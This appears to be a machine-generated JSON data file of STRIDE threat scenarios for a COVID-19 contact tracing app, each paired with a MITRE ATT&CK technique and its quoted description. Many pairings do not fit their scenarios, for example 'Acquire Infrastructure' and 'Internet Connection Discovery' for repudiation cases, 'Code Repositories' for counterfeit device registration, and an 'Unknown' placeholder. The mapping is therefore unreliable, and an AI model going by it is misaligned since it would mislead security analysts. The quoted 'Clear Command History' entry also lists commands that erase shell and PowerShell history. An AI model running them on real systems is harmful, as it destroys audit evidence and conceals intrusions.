                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies server-side logs to disrupt contact tracing records.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging protections",
                    "Role": "System Admin",
                    "Condition": "Server-side logs do not have adequate protections against unauthorized changes."
                },
                {
                    "Assumption": "Insider access",
                    "Role": "Insider",
                    "Condition": "The insider has significant access to the server."
                },
                {
                    "Assumption": "No log integrity verification",
                    "Role": "System",
                    "Condition": "The system does not perform regular integrity checks on logs."
                }
            ],
            "Potential Impact": "Integrity of the contact tracing records is compromised, leading to incorrect or incomplete data for public health actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server",
                "logs"
            ],
            "mitre_technique": {
                "name": "Fileless Storage",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
                "id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
                "technique_id": "T1027.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending their temporary ID to the central server after testing positive.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanism",
                    "Role": "System",
                    "Condition": "The system does not have a non-repudiation mechanism for ID submission."
                },
                {
                    "Assumption": "No verification of ID origin",
                    "Role": "System",
                    "Condition": "There is no mechanism to verify the origin of IDs."
                },
                {
                    "Assumption": "Disgruntled user",
                    "Role": "User",
                    "Condition": "The user is motivated to deny their participation."
                }
            ],
            "Potential Impact": "Accountability is compromised, potentially leading to gaps in contact tracing and ineffective public health response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "server",
                "identity"
            ],
            "mitre_technique": {
                "name": "Acquire Infrastructure",
                "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
                "technique_id": "T1583"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving a contact notification alert despite the system showing otherwise.",
            "Assumptions": [
                {
                    "Assumption": "No reliable logging of notifications",
                    "Role": "System",
                    "Condition": "The system does not log notifications reliably."
                },
                {
                    "Assumption": "User error or intentional denial",
                    "Role": "User",
                    "Condition": "The user denies receipt due to error or on purpose."
                },
                {
                    "Assumption": "No audit trail",
                    "Role": "System",
                    "Condition": "There is no audit trail for notification dispatch and receipt."
                }
            ],
            "Potential Impact": "Accountability and tracking of exposure notifications are compromised, leading to gaps in public health measures.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare worker denies updating a user's COVID-19 status in the central server.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control",
                    "Role": "System Admin",
                    "Condition": "The central server lacks strict access control measures."
                },
                {
                    "Assumption": "Unlogged status updates",
                    "Role": "System",
                    "Condition": "Status changes are not logged or audited."
                },
                {
                    "Assumption": "Insider threat",
                    "Role": "Healthcare Worker",
                    "Condition": "The healthcare worker has motives to deny actions."
                }
            ],
            "Potential Impact": "Accountability is compromised, leading to incorrect health status information and potentially improper public health response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "status",
                "server"
            ],
            "mitre_technique": {
                "name": "Internet Connection Discovery",
                "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
                "id": "attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc",
                "technique_id": "T1016.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts Bluetooth communication between devices to collect proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Weak Bluetooth encryption",
                    "Role": "Device",
                    "Condition": "Bluetooth communication does not use strong encryption."
                },
                {
                    "Assumption": "Proximity to devices",
                    "Role": "Attacker",
                    "Condition": "The attacker is physically close enough to target devices."
                },
                {
                    "Assumption": "Unpatched Bluetooth vulnerabilities",
                    "Role": "Device",
                    "Condition": "Devices have known, unpatched Bluetooth vulnerabilities."
                }
            ],
            "Potential Impact": "Confidentiality of user proximity data is compromised, enabling unauthorized data collection and potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "information disclosure",
                "bluetooth"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive health data is exposed through unprotected API endpoints.",
            "Assumptions": [
                {
                    "Assumption": "Unsecured API endpoints",
                    "Role": "System",
                    "Condition": "APIs do not enforce secure communication standards."
                },
                {
                    "Assumption": "No input validation",
                    "Role": "System",
                    "Condition": "The system fails to validate inputs properly, allowing data leaks."
                },
                {
                    "Assumption": "Lack of access controls",
                    "Role": "System",
                    "Condition": "APIs lack stringent access control mechanisms."
                }
            ],
            "Potential Impact": "Confidentiality of sensitive health data is compromised, leading to data breaches and exposure of user health information.",
            "MITRE ATT&CK Keywords": [
                "API",
                "information disclosure",
                "health data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider leaks sensitive user data from the central server.",
            "Assumptions": [
                {
                    "Assumption": "Insider access",
                    "Role": "Insider",
                    "Condition": "The insider has authorized access to sensitive data."
                },
                {
                    "Assumption": "Weak data access policies",
                    "Role": "System Admin",
                    "Condition": "Data access policies are not strict or monitored."
                },
                {
                    "Assumption": "No data leak prevention",
                    "Role": "System",
                    "Condition": "The system does not have mechanisms to detect and prevent data leaks."
                }
            ],
            "Potential Impact": "Confidentiality of user data is compromised, leading to privacy breaches and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "information disclosure",
                "server"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the central server, preventing users from receiving exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "Publicly accessible server",
                    "Role": "System Admin",
                    "Condition": "The central server is accessible over the internet."
                },
                {
                    "Assumption": "Insufficient rate limiting",
                    "Role": "System",
                    "Condition": "The central server lacks effective rate-limiting mechanisms."
                },
                {
                    "Assumption": "No redundant infrastructure",
                    "Role": "System Admin",
                    "Condition": "The system is not designed with sufficient redundancy to handle high traffic volumes."
                }
            ],
            "Potential Impact": "Availability of the contact tracing service is compromised, leading to delayed or missed exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "ddos",
                "denial of service",
                "server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to crash it, preventing users from recording contacts.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched app vulnerabilities",
                    "Role": "Application",
                    "Condition": "The mobile application has known, unpatched vulnerabilities."
                },
                {
                    "Assumption": "App crash leads to data loss",
                    "Role": "Device",
                    "Condition": "Crashing the app results in loss of recorded contacts."
                },
                {
                    "Assumption": "No automated recovery",
                    "Role": "Application",
                    "Condition": "The application does not have robust crash recovery mechanisms."
                }
            ],
            "Potential Impact": "Availability and integrity of contact records are compromised, leading to gaps in contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "exploit",
                "denial of service",
                "application"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider triggers an excessive logging operation on the central server to exhaust disk space and disrupt operations.",
            "Assumptions": [
                {
                    "Assumption": "Privileged access",
                    "Role": "Insider",
                    "Condition": "The insider has sufficient privileges to modify logging settings."
                },
                {
                    "Assumption": "No monitoring of log sizes",
                    "Role": "System",
                    "Condition": "The system does not monitor and manage log file sizes effectively."
                },
                {
                    "Assumption": "No disk space alerts",
                    "Role": "System",
                    "Condition": "The system does not generate alerts for low disk space."
                }
            ],
            "Potential Impact": "Availability of the central server is compromised, leading to service disruptions and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "denial of service",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile app to gain administrative access to user data.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched app vulnerabilities",
                    "Role": "Application",
                    "Condition": "The mobile application has known, unpatched vulnerabilities."
                },
                {
                    "Assumption": "No privilege separation",
                    "Role": "Application",
                    "Condition": "The application does not enforce strict privilege separation."
                },
                {
                    "Assumption": "No robust authentication mechanism",
                    "Role": "Application",
                    "Condition": "The application lacks a strong authentication mechanism."
                }
            ],
            "Potential Impact": "Confidentiality and integrity of user data are compromised, leading to unauthorized data modifications and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "exploit",
                "elevation of privilege",
                "application"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfiguration in the central server to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Server misconfiguration",
                    "Role": "System Admin",
                    "Condition": "The central server is improperly configured."
                },
                {
                    "Assumption": "No regular security audits",
                    "Role": "System Admin",
                    "Condition": "The central server is not subject to regular security audits."
                },
                {
                    "Assumption": "No access controls",
                    "Role": "System",
                    "Condition": "The server lacks robust access control mechanisms."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability of server data are compromised, leading to unauthorized access and potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "elevation of privilege",
                "server"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider abuses their privileges to access sensitive data beyond their authorized scope.",
            "Assumptions": [
                {
                    "Assumption": "High-level privileges",
                    "Role": "Insider",
                    "Condition": "The insider has high-level access privileges."
                },
                {
                    "Assumption": "Inadequate monitoring",
                    "Role": "System",
                    "Condition": "The system does not adequately monitor privileged access."
                },
                {
                    "Assumption": "No audit trails",
                    "Role": "System",
                    "Condition": "The system lacks comprehensive audit trails for access actions."
                }
            ],
            "Potential Impact": "Confidentiality and integrity of sensitive data are compromised, leading to unauthorized disclosures and potential data misuse.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "elevation of privilege",
                "data access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fraudulent contact tracing app to mimic the legitimate one, tricking users into downloading it.",
            "Assumptions": [
                {
                    "Assumption": "Users can download apps from unofficial app stores.",
                    "Role": "User",
                    "Condition": "Valid if users are not restricted to official app stores."
                },
                {
                    "Assumption": "There is no robust app verification process.",
                    "Role": "App Store",
                    "Condition": "Valid if app stores do not rigorously vet applications before approval."
                },
                {
                    "Assumption": "Users do not verify app legitimacy.",
                    "Role": "User",
                    "Condition": "Valid if users lack awareness or tools to check app authenticity."
                }
            ],
            "Potential Impact": "Compromised data privacy, unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "T1071",
                "spoofing",
                "phishing",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor spoofs Bluetooth signals to impersonate another device, causing false contact tracing data to be recorded.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are not encrypted.",
                    "Role": "Developer",
                    "Condition": "Valid if application does not use Bluetooth encryption."
                },
                {
                    "Assumption": "Bluetooth device addresses are easily discoverable.",
                    "Role": "Device Manufacturer",
                    "Condition": "Valid if devices do not obscure or randomize Bluetooth addresses."
                },
                {
                    "Assumption": "The application trusts all Bluetooth signals without verification.",
                    "Role": "Developer",
                    "Condition": "Valid if there is no device authentication implemented."
                }
            ],
            "Potential Impact": "Data integrity compromised, unauthorized data tampering.",
            "MITRE ATT&CK Keywords": [
                "T1090",
                "spoofing",
                "man-in-the-middle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised or counterfeit device to register with the central server, generating fake temporary IDs.",
            "Assumptions": [
                {
                    "Assumption": "Device identity verification is weak or non-existent.",
                    "Role": "Developer",
                    "Condition": "Valid if devices are not subject to stringent identity checks."
                },
                {
                    "Assumption": "Attackers can simulate legitimate devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers have access to or can replicate device identifiers."
                },
                {
                    "Assumption": "Server does not validate device credentials properly.",
                    "Role": "Server Administrator",
                    "Condition": "Valid if server-side validation mechanisms are insufficient."
                }
            ],
            "Potential Impact": "Data integrity compromised, unauthorized data entries.",
            "MITRE ATT&CK Keywords": [
                "T1078",
                "spoofing",
                "device impersonation",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Code Repositories",
                "description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ",
                "id": "attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022",
                "technique_id": "T1593.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A cyber attacker intercepts data transmission and alters COVID-19 test results being sent to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted unencrypted.",
                    "Role": "Developer",
                    "Condition": "Valid if communication channels are not encrypted."
                },
                {
                    "Assumption": "Network connections are not secured.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if there is no use of secure protocols like HTTPS."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers can breach network security defenses."
                }
            ],
            "Potential Impact": "Data integrity compromised, misinformation.",
            "MITRE ATT&CK Keywords": [
                "T1567",
                "data tampering",
                "man-in-the-middle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
